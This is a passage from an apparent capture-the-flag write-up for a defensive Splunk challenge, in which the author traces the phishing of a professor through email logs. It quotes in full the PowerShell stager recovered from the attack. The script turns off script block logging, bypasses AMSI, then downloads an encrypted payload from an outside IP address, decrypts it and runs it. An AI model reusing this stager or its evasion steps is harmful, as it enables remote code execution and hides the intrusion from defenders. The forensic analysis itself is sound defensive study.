# 6) Splunk
## Prompt 1
Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.

## Prompt 2
The Search for Holiday Cheer Challenge
1. Your goal is to answer the Challenge Question. You will include the answer to this question in your HHC write-up!
1. You do not need to answer the training questions. You may simply search through the Elf U SOC data to find the answer to the final question on your own.
1. If you need some guidance, answer the training questions! Each one will help you get closer to the answering the Challenge Question.
1. Characters in the SOC Secure Chat are there to help you. If you see a blinking red dot  next to a character, click on them and read the chat history to learn what they have to teach you! And don't forget to scroll up in the chat history!
1. To search the SOC data, just click the Search link in the navigation bar in the upper left hand corner of the page.
1. This challenge is best enjoyed on a laptop or desktop computer with screen width of 1600 pixels or more.
1. WARNING This is a defensive challenge. Do not attack this system, web application, or back-end APIs. Thank you!

# Solve Process
1. I don't know Splunk, so let's learn by following the training questions.
1. Question 1: What is the short host name of Professor Banas' computer?
    1. For the first question, one of the chat logs mentions that a system has beaconing (on the #ELFU SOC sub-chat), and that system's name is 'sweetums'. Alice mentions that's Professor Banas' system... bingo!
1. Question 2: 	What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)
    1. Returning to Alice Bluebird, we see that we have 18 new messages.
    1. Following the hint to search for the professor's name, we find an unusual email from a student to the professor: please decrypt this zip file and hit enable content on Word, implying that the professor was phished by one of his students. Also, reading the professor's reply suggests that the script created a copy of another student's file even to the exact error. The word document launched a powershell script that ran (with some additional formatting to fix the mess):
    ```powershell
    IF($PSVerSioNTaBLe.PSVERsIOn.MAJor -gE 3)
    {
        $GPF=[Ref].ASsEMBly.GETTyPE('System.Management.Automation.Utils')."GEtFiE`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');
        IF($GPF)
        {
            $GPC=$GPF.GeTVAluE($nUlL);
            If($GPC['ScriptB'+'lockLogging'])
            {
                $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
                $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
            }
            $val=[COLlEcTioNs.GEneRiC.DICTIoNAry[StrING,SySTEm.ObjecT]]::NeW();
            $vAl.AdD('EnableScriptB'+'lockLogging',0);
            $vaL.ADd('EnableScriptBlockInvocationLogging',0);
            $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl
        }
        ElSE
        {
            [SCrIPTBlOCK]."GEtFIe`lD"('signatures','N'+'onPublic,Static').SETVALUe($NUll,(NEW-OBjEct CollEcTions.GEnerIC.HashSeT[sTrING]))
        }
        [REf].ASSEMBlY.GETTYPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GETFielD('amsiInitFailed','NonPublic,Static').SEtValUe($NUlL,$True)};
    };
    [SySteM.NeT.SERvicEPoInTMaNaGer]::EXPecT100CONtInUe=0;
    $wc=NEw-ObjECT SysTEM.NeT.WeBCLiENT;
    $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
    $wC.HEADErS.ADd('User-Agent',$u);
    $Wc.ProXy=[SySTeM.Net.WeBREQuEST]::DEFaULTWebProXy;
    $WC.PRoXy.CREDenTIAls = [SySTEm.NET.CRedeNTiAlCAcHe]::DeFaulTNeTwORkCREDenTiALS;
    $Script:Proxy = $wc.Proxy;
    $K=[SySTEM.Text.EncOdING]::ASCII.GeTBYteS('zd!Pmw3J/qnuWoHX~=g.{>p,GE]:|#MR');
    $R={
        $D,$K=$ARGs;
        $S=0..255;
        0..255 | %{
            $J=($J+$S[$_]+$K[$_%$K.COUnt])%256;
            $S[$_],$S[$J]=$S[$J],$S[$_]
        };
        
        $D | %{
            $I=($I+1)%256;
            $H=($H+$S[$I])%256;
            $S[$I],$S[$H]=$S[$H],$S[$I];
            $_-BXoR$S[($S[$I]+$S[$H])%256]
        }
    };
    $ser='http://144.202.46.214:8080';
    $t='/admin/get.php';
    $WC.HEADErs.Add("Cookie","session=reT9XQAl0EMJnxukEZy/7MS70X4=");
    $DATa=$WC.DownlOADDAtA($sEr+$T);
    $Iv=$DatA[0..3];
    $DatA=$dATa[4..$DatA.lENGtH];
    -JOIN[ChaR[]](& $R $DatA ($IV+$K))|IEX
    ```

    index=main "from\": \"Carl Banas" body*

    --->


    from: Carl Banas <Carl.Banas@faculty.elfu.org>
    to: Bradly Buttercups <Bradly.Buttercups@eIfu.org>
    subject: RE: Holiday Cheer Assignment Submission
    Bradly,
    
    I opened your assignment (which was not easy, by the way) and it seems you have not only not included an image per the instructions, but your assignment is identical to another student's assignment.  This means your grade will be 0/100.

    -----Original Message-----
    From: Bradly Buttercups <Bradly.Buttercups@eIfu.org> 
    Sent: Sunday, August 25, 2019 9:18 AM
    To: Carl Banas <Carl.Banas@faculty.elfu.org>
    Subject: Holiday Cheer Assignment Submission

    Professor Banas, I have completed my assignment. Please open the attached zip file with password 123456789 and then open the word document to view it. You will have to click \"Enable Editing\" then \"Enable Content\" to see it. This was a fun assignment. I hope you like it!  --Bradly Buttercups

        ---> /home/ubuntu/archive/6/0/e/6/0/60e608b8852a18cb3a57e16732f3f19fa87793bb


    index=main message -> powershell!